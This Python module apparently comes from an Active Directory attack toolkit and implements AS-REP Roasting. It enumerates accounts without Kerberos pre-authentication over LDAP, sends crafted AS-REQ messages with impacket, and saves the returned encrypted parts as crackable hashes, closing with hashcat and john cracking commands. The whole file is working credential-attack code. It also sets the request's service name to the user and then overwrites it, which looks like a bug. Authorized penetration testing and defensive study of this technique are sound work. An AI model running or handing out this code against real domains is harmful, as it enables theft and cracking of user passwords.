"""AS-REP Roasting — request AS-REP for accounts without pre-authentication."""

from __future__ import annotations

import os
import sys
from datetime import datetime, timezone
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.attack.asreproast.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_asrep_requests"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.004"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] AS-REP Roasting → {args.target} ({args.domain})")

    try:
        from impacket.krb5.asn1 import AS_REP
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        from pyasn1.codec.der import decoder, encoder
    except ImportError:
        print("[!] impacket not installed: pip install impacket", file=sys.stderr)
        return 1

    from adxpl.core.ldap_session import connect, get_base_dn
    import json
    import ldap3

    users_to_test = []

    if cred.has_password or cred.has_hash:
        conn = connect(args.target, cred)
        base_dn = get_base_dn(args.domain)
        conn.search(
            base_dn,
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            attributes=["sAMAccountName"],
            search_scope=ldap3.SUBTREE,
            paged_size=1000,
        )
        for entry in conn.entries:
            data = json.loads(entry.entry_to_json())
            sam = data.get("attributes", {}).get("sAMAccountName", "")
            if isinstance(sam, list):
                sam = sam[0] if sam else ""
            if sam:
                users_to_test.append(sam)
        print(f"[+] LDAP found {len(users_to_test)} accounts with DONT_REQ_PREAUTH")
    else:
        print("[*] No credentials provided — attempting with username only")
        if cred.username:
            users_to_test = [cred.username]

    if not users_to_test:
        print("[-] No AS-REP roastable accounts found")
        return 0

    hashes = []
    for username in users_to_test:
        try:
            user_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

            from impacket.krb5.asn1 import AS_REQ, seq_set, seq_set_iter
            from impacket.krb5.types import KerberosTime
            from pyasn1.type.univ import noValue
            import random

            as_req = AS_REQ()
            domain_upper = args.domain.upper()

            as_req["pvno"] = 5
            as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

            req_body = as_req["req-body"]
            req_body["kdc-options"] = constants.encodeFlags({
                constants.KDCOptions.forwardable.value,
                constants.KDCOptions.renewable.value,
                constants.KDCOptions.proxiable.value,
            })

            seq_set(req_body, "sname", user_name.components_to_asn1)
            req_body["realm"] = domain_upper

            krbtgt = Principal(f"krbtgt/{domain_upper}", type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(req_body, "sname", krbtgt.components_to_asn1)

            now = datetime.now(timezone.utc)
            req_body["till"] = KerberosTime.to_asn1(
                datetime(now.year + 1, now.month, now.day, tzinfo=timezone.utc)
            )
            req_body["rtime"] = KerberosTime.to_asn1(
                datetime(now.year + 1, now.month, now.day, tzinfo=timezone.utc)
            )
            req_body["nonce"] = random.getrandbits(31)

            seq_set_iter(req_body, "etype", [23, 17, 18])

            message = encoder.encode(as_req)
            response = sendReceive(message, args.domain, args.target)
            as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]

            enc_part = as_rep["enc-part"]
            etype = int(enc_part["etype"])
            cipher = bytes(enc_part["cipher"])

            if etype == 23:
                h = f"$krb5asrep$23${username}@{domain_upper}:{cipher[:16].hex()}${cipher[16:].hex()}"
            else:
                h = f"$krb5asrep${etype}${username}@{domain_upper}:{cipher.hex()}"

            hashes.append(h)
            print(f"  [+] {username} → AS-REP hash obtained (etype {etype})")

        except KerberosError as exc:
            if "KDC_ERR_PREAUTH_REQUIRED" in str(exc):
                print(f"  [-] {username}: pre-auth required (not vulnerable)")
            else:
                print(f"  [-] {username}: {exc}", file=sys.stderr)
        except Exception as exc:
            print(f"  [-] {username}: {exc}", file=sys.stderr)

    if hashes:
        os.makedirs(args.output, exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(args.output, f"asreproast_{ts}.txt")
        with open(out_path, "w") as fh:
            fh.write("\n".join(hashes))
        print(f"\n[+] {len(hashes)} AS-REP hashes → {out_path}")
        print("[*] Crack with: hashcat -m 18200 or john --format=krb5asrep")
    else:
        print("[-] No AS-REP hashes obtained")
    return 0
